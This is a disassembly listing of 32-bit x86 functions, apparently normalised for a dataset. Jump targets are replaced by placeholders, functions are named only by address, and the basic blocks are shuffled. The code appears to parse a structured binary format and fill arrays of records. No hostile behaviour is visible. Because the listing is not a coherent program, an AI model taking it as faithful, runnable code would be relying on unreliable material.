add eax [ edx + 0x4 ]
mov [ ebp - 0x4c ] eax
jmp r-xdata
lea ecx [ ebp - 0x15 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4041a0
add esp 0x8
mov [ ebp - 0x84 ] eax
cmp [ ebp - 0x84 ] 0x0
je r-xdata
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp - 0x30 ]
push eax
mov ecx [ ebp - 0x38 ]
add ecx 0x10
push ecx
call sub_402320
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0x54 ]
jmp r-xdata
mov ecx [ ebp - 0x38 ]
cmp [ ecx ] 0x20
ja r-xdata
mov eax [ ebp - 0x5c ]
jmp r-xdata
mov [ ebp - 0x34 ] 0x0
jmp r-xdata
mov [ ebp - 0x34 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x34 ]
add eax 0x1
mov [ ebp - 0x34 ] eax
movzx eax [ ebp - 0x15 ]
and eax 0xf
cdq
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
call sub_404460
add esp 0xc
mov [ ebp - 0x6c ] eax
cmp [ ebp - 0x6c ] 0x0
je r-xdata
mov eax [ ebp - 0x84 ]
jmp r-xdata
mov edx [ ebp - 0x30 ]
push edx
mov eax [ ebp - 0x38 ]
mov ecx [ eax + 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4041e0
add esp 0xc
mov [ ebp - 0x64 ] eax
cmp [ ebp - 0x64 ] 0x0
je r-xdata
mov eax 0x2
jmp r-xdata
mov eax 0x4
jmp r-xdata
mov edx [ ebp - 0x38 ]
cmp [ edx + 0x4 ] 0x20
jbe r-xdata
mov ecx [ ebp - 0x34 ]
cmp ecx [ ebp - 0x48 ]
jae r-xdata
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0x40 ]
jae r-xdata
movzx ecx [ ebp - 0x15 ]
and ecx 0x10
je r-xdata
mov eax [ ebp - 0x6c ]
jmp r-xdata
mov eax [ ebp - 0x64 ]
jmp r-xdata
jmp r-xdata
xor eax eax
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp - 0x34 ]
lea edx [ eax + ecx * 4 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4043c0
add esp 0x8
mov [ ebp - 0x80 ] eax
cmp [ ebp - 0x80 ] 0x0
je r-xdata
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0x40 ]
jne r-xdata
mov ecx [ ebp - 0x34 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call sub_403ac0
add esp 0x8
test eax eax
jge r-xdata
movzx eax [ ebp - 0x15 ]
and eax 0x20
je r-xdata
lea edx [ ebp - 0x28 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4043c0
add esp 0x8
mov [ ebp - 0x94 ] eax
cmp [ ebp - 0x94 ] 0x0
je r-xdata
movzx edx [ ebp - 0x15 ]
and edx 0x20
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x80 ]
jmp r-xdata
mov ecx 0x4
imul ecx ecx 0x0
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x8 ]
mov edx [ ebp - 0x34 ]
mov [ ecx + eax ] edx
jmp r-xdata
mov eax 0x4
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
xorpd xmm0 xmm0
movlpd [ ebp - 0x24 ] xmm0
lea ecx [ ebp - 0x24 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4042b0
add esp 0x8
mov [ ebp - 0x8c ] eax
cmp [ ebp - 0x8c ] 0x0
je r-xdata
lea ecx [ ebp - 0x28 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4043c0
add esp 0x8
mov [ ebp - 0x74 ] eax
cmp [ ebp - 0x74 ] 0x0
je r-xdata
mov eax [ ebp - 0x94 ]
jmp r-xdata
mov eax [ ebp - 0x34 ]
add eax 0x1
mov [ ebp - 0x34 ] eax
mov edx [ ebp - 0x34 ]
add edx 0x1
mov [ ebp - 0x34 ] edx
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x24 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_404460
add esp 0xc
mov [ ebp - 0x7c ] eax
cmp [ ebp - 0x7c ] 0x0
je r-xdata
mov eax [ ebp - 0x8c ]
jmp r-xdata
mov eax [ ebp - 0x74 ]
jmp r-xdata
mov eax [ ebp - 0x7c ]
jmp r-xdata
sub_405120
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x0
push 0xb
mov eax [ ebp + 0x8 ]
push eax
call sub_404560
add esp 0xc
mov [ ebp - 0x50 ] eax
cmp [ ebp - 0x50 ] 0x0
je r-xdata
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4043c0
add esp 0x8
mov [ ebp - 0x54 ] eax
cmp [ ebp - 0x54 ] 0x0
je r-xdata
mov eax [ ebp - 0x50 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_404ac0
add esp 0x4
mov [ ebp - 0x30 ] eax
cmp [ ebp - 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x54 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
cmp [ ecx ] 0x0
jne r-xdata
mov eax [ ebp - 0x30 ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
imul ecx ecx 0x28
push ecx
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
call ecx
add esp 0x8
mov edx [ ebp + 0x10 ]
mov [ edx ] eax
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0x0
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ edx ] 0x0
jmp r-xdata
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x18 ]
cmp eax [ edx ]
jae r-xdata
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x18 ]
imul ecx ecx 0x28
mov edx [ ebp + 0x10 ]
add ecx [ edx ]
push ecx
call sub_403950
add esp 0x4
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x18 ]
cmp edx [ ecx ]
jae r-xdata
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
push 0x0
push 0xc
mov ecx [ ebp + 0x8 ]
push ecx
call sub_404560
add esp 0xc
mov [ ebp - 0x38 ] eax
cmp [ ebp - 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp - 0x18 ]
imul ecx ecx 0x28
mov edx [ ebp + 0x10 ]
add ecx [ edx ]
push ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_404b20
add esp 0xc
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x38 ]
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x28 ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x18 ]
cmp ecx [ eax ]
jae r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
lea ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_404440
add esp 0x8
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x2c ] 0x0
je r-xdata
mov edx [ ebp - 0x18 ]
imul edx edx 0x28
mov eax [ ebp + 0x10 ]
add edx [ eax ]
mov [ ebp - 0x20 ] edx
mov ecx [ ebp - 0x20 ]
push ecx
call sub_403a70
add esp 0x4
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
or eax [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x2c ]
jmp r-xdata
mov eax [ ebp - 0x24 ]
shl eax 0x3
push eax
mov ecx [ ebp + 0x14 ]
push ecx
mov edx [ ebp + 0x14 ]
mov eax [ edx ]
call eax
add esp 0x8
mov [ ebp - 0x48 ] eax
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x48 ]
mov [ ecx + 0xc ] edx
cmp [ ebp - 0x48 ] 0x0
jne r-xdata
mov edx [ ebp - 0x20 ]
mov [ edx + 0xc ] 0x0
jmp r-xdata
cmp [ ebp - 0xc ] 0xa
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4044b0
add esp 0x4
mov [ ebp - 0x4c ] eax
cmp [ ebp - 0x4c ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp - 0x24 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x4c ]
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov ecx [ ebp + 0x18 ]
push ecx
lea edx [ ebp - 0x14 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_404790
add esp 0x14
mov [ ebp - 0x3c ] eax
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ edx + 0xc ]
mov ecx [ ebp - 0x1c ]
lea edx [ eax + ecx * 8 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4042b0
add esp 0x8
mov [ ebp - 0x40 ] eax
cmp [ ebp - 0x40 ] 0x0
je r-xdata
mov edx [ ebp - 0x14 ]
push edx
mov eax [ ebp + 0x18 ]
push eax
mov ecx [ ebp + 0x18 ]
mov edx [ ecx + 0x4 ]
call edx
add esp 0x8
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp + 0x18 ]
push ecx
mov edx [ ebp + 0x18 ]
mov eax [ edx + 0x4 ]
call eax
add esp 0x8
mov ecx [ ebp - 0x3c ]
mov [ ebp - 0x44 ] ecx
cmp [ ebp - 0x44 ] 0x0
je r-xdata
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov eax [ ebp - 0x40 ]
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x44 ]
jmp r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x18 ]
cmp eax [ edx ]
jae r-xdata
mov eax [ ebp - 0x1c ]
add eax 0x1
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x18 ]
imul ecx ecx 0x28
mov edx [ ebp + 0x10 ]
add ecx [ edx ]
mov [ ebp - 0x34 ] ecx
mov eax [ ebp - 0x10 ]
add eax [ ebp - 0x18 ]
movzx ecx [ eax ]
mov edx [ ebp - 0x34 ]
mov [ edx + 0x1c ] ecx
mov eax [ ebp - 0x34 ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov ecx [ edx + ecx * 4 ]
mov [ eax + 0x20 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
sub_405470
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
xorpd xmm0 xmm0
movlpd [ ebp - 0xc ] xmm0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x34 ] 0x0
mov [ ebp - 0x24 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x24 ]
cmp ecx [ ebp + 0xc ]
jae r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] edx
mov edx [ ebp - 0x24 ]
imul edx edx 0x28
mov eax [ ebp + 0x10 ]
mov [ eax + edx + 0x24 ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] 0xd
jne r-xdata
mov eax [ ebp - 0x64 ]
jmp r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x1
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0xc ] 0xa
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xc ] 0x9
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] 0x0
mov [ ebp - 0x24 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0xc ]
or ecx [ ebp - 0x8 ]
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x24 ]
cmp ecx [ ebp + 0xc ]
jae r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4044b0
add esp 0x4
mov [ ebp - 0x48 ] eax
cmp [ ebp - 0x48 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp + 0x14 ]
cmp [ eax ] 0x0
jne r-xdata
jmp r-xdata
lea edx [ ebp - 0x10 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4043c0
add esp 0x8
mov [ ebp - 0x6c ] eax
cmp [ ebp - 0x6c ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x48 ]
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
shl edx 0x3
push edx
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp + 0x24 ]
mov edx [ ecx ]
call edx
add esp 0x8
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
mov edx [ ebp + 0x18 ]
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ ebp + 0x18 ]
mov [ ecx ] 0x0
mov edx [ ebp + 0x1c ]
mov [ edx ] 0x0
mov eax [ ebp + 0x20 ]
mov [ eax ] 0x0
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_404440
add esp 0x8
mov [ ebp - 0x64 ] eax
cmp [ ebp - 0x64 ] 0x0
je r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0x28
mov edx [ ebp + 0x10 ]
mov eax [ ebp - 0x10 ]
mov [ edx + ecx + 0x24 ] eax
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
add edx [ ebp - 0x10 ]
mov eax [ ebp + 0x14 ]
mov [ eax ] edx
jmp r-xdata
mov eax [ ebp - 0x6c ]
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
push ecx
mov edx [ ebp + 0x24 ]
push edx
mov eax [ ebp + 0x24 ]
mov ecx [ eax ]
call ecx
add esp 0x8
mov edx [ ebp + 0x1c ]
mov [ edx ] eax
mov eax [ ebp + 0x1c ]
cmp [ eax ] 0x0
jne r-xdata
mov eax 0x2
jmp r-xdata
mov [ ebp - 0x24 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x1
mov [ ebp - 0x24 ] eax
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
shl edx 0x2
push edx
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp + 0x24 ]
mov edx [ ecx ]
call edx
add esp 0x8
mov ecx [ ebp + 0x20 ]
mov [ ecx ] eax
mov edx [ ebp + 0x20 ]
cmp [ edx ] 0x0
jne r-xdata
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0x24 ]
cmp ecx [ ebp + 0xc ]
jae r-xdata
mov eax 0x2
jmp r-xdata
cmp [ ebp - 0xc ] 0x9
jne r-xdata
xorpd xmm0 xmm0
movlpd [ ebp - 0x44 ] xmm0
mov edx [ ebp - 0x24 ]
imul edx edx 0x28
mov eax [ ebp + 0x10 ]
mov ecx [ eax + edx + 0x24 ]
mov [ ebp - 0x74 ] ecx
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
mov [ ebp - 0x24 ] 0x0
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
cmp [ ebp - 0xc ] 0x9
jne r-xdata
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x24 ]
cmp ecx [ eax ]
jae r-xdata
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_404440
add esp 0x8
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x70 ] 0x0
je r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0x28
add ecx [ ebp + 0x10 ]
push ecx
call sub_403b50
add esp 0x4
sub eax [ ebp - 0x44 ]
sbb edx [ ebp - 0x40 ]
mov ecx [ ebp + 0x18 ]
mov ecx [ ecx ]
mov esi [ ebp - 0x28 ]
mov [ ecx + esi * 8 ] eax
mov [ ecx + esi * 8 + 0x4 ] edx
mov edx [ ebp - 0x28 ]
add edx 0x1
mov [ ebp - 0x28 ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x1
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x24 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x1c ]
mov eax [ edx ]
mov ecx [ ebp - 0x24 ]
mov [ eax + ecx ] 0x0
mov edx [ ebp + 0x20 ]
mov eax [ edx ]
mov ecx [ ebp - 0x24 ]
mov [ eax + ecx * 4 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x70 ]
jmp r-xdata
mov [ ebp - 0x3c ] 0x1
jmp r-xdata
mov eax [ ebp - 0x24 ]
cmp eax [ ebp + 0xc ]
jae r-xdata
mov edx [ ebp - 0x24 ]
add edx 0x1
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x3c ]
cmp eax [ ebp - 0x74 ]
jae r-xdata
mov [ ebp - 0x28 ] 0x0
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0x28
mov edx [ ebp + 0x10 ]
mov eax [ edx + ecx + 0x24 ]
mov [ ebp - 0x58 ] eax
cmp [ ebp - 0x58 ] 0x1
jne r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4042b0
add esp 0x8
mov [ ebp - 0x50 ] eax
cmp [ ebp - 0x50 ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
or ecx [ ebp - 0x8 ]
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x34 ]
add eax [ ebp - 0x58 ]
mov [ ebp - 0x34 ] eax
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0x28
mov edx [ ebp + 0x10 ]
cmp [ edx + ecx + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp + 0x18 ]
mov ecx [ eax ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov [ ecx + edx * 8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ecx + edx * 8 + 0x4 ] eax
mov ecx [ ebp - 0x28 ]
add ecx 0x1
mov [ ebp - 0x28 ] ecx
mov edx [ ebp - 0x44 ]
add edx [ ebp - 0x18 ]
mov eax [ ebp - 0x40 ]
adc eax [ ebp - 0x14 ]
mov [ ebp - 0x44 ] edx
mov [ ebp - 0x40 ] eax
jmp r-xdata
mov eax [ ebp - 0x50 ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4044b0
add esp 0x4
mov [ ebp - 0x54 ] eax
cmp [ ebp - 0x54 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
mov ecx [ ebp + 0x24 ]
push ecx
lea edx [ ebp - 0x1c ]
push edx
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x34 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_404790
add esp 0x14
mov [ ebp - 0x60 ] eax
cmp [ ebp - 0x60 ] 0x0
jne r-xdata
mov edx [ ebp - 0x24 ]
add edx 0x1
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov edx [ ebp - 0x3c ]
add edx 0x1
mov [ ebp - 0x3c ] edx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_404440
add esp 0x8
mov [ ebp - 0x5c ] eax
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov eax [ ebp - 0x54 ]
jmp r-xdata
mov ecx [ ebp - 0x20 ]
push ecx
mov edx [ ebp + 0x24 ]
push edx
mov eax [ ebp + 0x24 ]
mov ecx [ eax + 0x4 ]
call ecx
add esp 0x8
mov edx [ ebp - 0x1c ]
push edx
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp + 0x24 ]
mov edx [ ecx + 0x4 ]
call edx
add esp 0x8
mov eax [ ebp - 0x60 ]
mov [ ebp - 0x4c ] eax
cmp [ ebp - 0x4c ] 0x0
je r-xdata
mov [ ebp - 0x24 ] 0x0
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x5c ]
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4c ]
jmp r-xdata
mov ecx [ ebp - 0x24 ]
cmp ecx [ ebp + 0xc ]
jae r-xdata
cmp [ ebp - 0xc ] 0xa
jne r-xdata
mov edx [ ebp - 0x24 ]
imul edx edx 0x28
add edx [ ebp + 0x10 ]
mov [ ebp - 0x38 ] edx
mov eax [ ebp - 0x38 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x68 ] ecx
cmp [ ebp - 0x68 ] 0x1
jne r-xdata
mov [ ebp - 0x30 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x38 ]
cmp [ edx + 0x1c ] 0x0
je r-xdata
mov ecx [ ebp - 0x30 ]
cmp ecx [ ebp - 0x68 ]
jae r-xdata
mov eax [ ebp + 0x1c ]
mov ecx [ eax ]
mov edx [ ebp - 0x28 ]
mov [ ecx + edx ] 0x1
mov eax [ ebp + 0x20 ]
mov ecx [ eax ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x38 ]
mov eax [ eax + 0x20 ]
mov [ ecx + edx * 4 ] eax
mov ecx [ ebp - 0x28 ]
add ecx 0x1
mov [ ebp - 0x28 ] ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp + 0x1c ]
mov eax [ edx ]
mov ecx [ ebp - 0x20 ]
add ecx [ ebp - 0x2c ]
mov edx [ ebp - 0x28 ]
mov cl [ ecx ]
mov [ eax + edx ] cl
mov edx [ ebp + 0x20 ]
mov eax [ edx ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x2c ]
mov esi [ ebp - 0x1c ]
mov edx [ esi + edx * 4 ]
mov [ eax + ecx * 4 ] edx
mov eax [ ebp - 0x28 ]
add eax 0x1
mov [ ebp - 0x28 ] eax
jmp r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x1
mov [ ebp - 0x24 ] eax
mov edx [ ebp - 0x30 ]
add edx 0x1
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x2c ]
add eax 0x1
mov [ ebp - 0x2c ] eax
sub_4059b0
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
cdq
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
mov edx [ ebp - 0x28 ]
cmp edx [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0x20 ]
jmp r-xdata
mov eax 0x4
jmp r-xdata
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x1c ] ecx
cmp [ ebp - 0x1c ] 0x8
ja r-xdata
mov eax 0x4
jmp r-xdata
mov edx [ ebp - 0x1c ]
jmp [ edx * 4 + jump_table_405af0 ]
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp + 0x10 ]
add ecx 0x8
push ecx
mov edx [ ebp + 0x10 ]
add edx 0x4
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x10 ]
add ecx 0x14
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_404860
add esp 0x1c
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ecx [ ebp + 0x28 ]
push ecx
mov edx [ ebp + 0x24 ]
push edx
mov eax [ ebp + 0x10 ]
add eax 0xc
push eax
mov ecx [ ebp + 0x10 ]
add ecx 0x18
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_405120
add esp 0x14
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x28 ]
push eax
mov ecx [ ebp + 0x20 ]
push ecx
mov edx [ ebp + 0x1c ]
push edx
mov eax [ ebp + 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
push ecx
mov edx [ ebp + 0x10 ]
mov eax [ edx + 0xc ]
push eax
mov ecx [ ebp + 0x10 ]
mov edx [ ecx + 0x18 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_405470
add esp 0x20
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x18 ]
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_404440
add esp 0x8
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
je r-xdata
sub_405b20
push ebp
mov ebp esp
sub esp 0xc
push esi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x40 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x40 ]
mov edx [ ebp + 0xc ]
mov esi [ ebp + 0xc ]
mov ecx [ ecx + edx * 4 + 0x4 ]
sub ecx [ eax + esi * 4 ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x40 ]
mov ecx [ ebp + 0xc ]
mov edx [ eax + ecx * 4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x44 ]
lea edx [ ecx + edx * 2 ]
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp - 0x8 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x10 ]
mov ecx [ ebp - 0x4 ]
mov esi [ ebp - 0xc ]
mov cx [ esi + ecx * 2 ]
mov [ eax + edx * 2 ] cx
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
sub_405ba0
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + edx * 4 ] ecx
mov edx [ ebp - 0x4 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + edx * 4 ] ecx
mov [ ebp - 0xc ] 0x10
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
movzx edx [ ecx + eax * 2 ]
test edx edx
jne r-xdata
mov eax 0x10
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
movzx edx [ ecx + eax * 2 + 0x1 ]
test edx edx
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
cmp edx [ ebp + 0xc ]
jb r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
sub_405c50
push ebp
mov ebp esp
sub esp 0xc4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x34 ] 0x0
mov [ ebp - 0x44 ] 0x0
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_404440
add esp 0x8
mov [ ebp - 0x68 ] eax
cmp [ ebp - 0x68 ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x2
jne r-xdata
mov eax [ ebp - 0x68 ]
